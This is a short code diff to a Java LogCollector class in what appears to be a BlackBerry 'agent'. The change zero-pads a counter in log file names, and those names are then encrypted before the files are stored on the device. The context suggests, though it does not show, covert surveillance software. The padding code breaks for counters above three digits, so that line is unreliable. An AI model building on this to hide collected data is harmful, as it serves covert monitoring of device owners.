@@ -18,6 +18,7 @@ import javax.microedition.io.file.FileConnection;
 
 import net.rim.device.api.system.PersistentObject;
 import net.rim.device.api.system.PersistentStore;
+import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.agent.Agent;
 import blackberry.config.Keys;
@@ -259,7 +260,13 @@ public final class LogCollector implements Singleton {
         final String basePath = onSD ? Path.SD_PATH : Path.USER_PATH;
 
         final String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
-        final String fileName = progressive + "!" + makeDateName(timestamp);
+        
+        // http://www.rgagnon.com/javadetails/java-0021.html
+        String mask = "000";
+        String ds = Long.toString(progressive);  // double to string
+        String paddedProgressive = mask.substring(0 , mask.length() - ds.length()) + ds;
+        
+        final String fileName = paddedProgressive + "!" + makeDateName(timestamp);
 
         final String encName = Encryption.encryptName(fileName + LOG_EXTENSION,
                 seed);
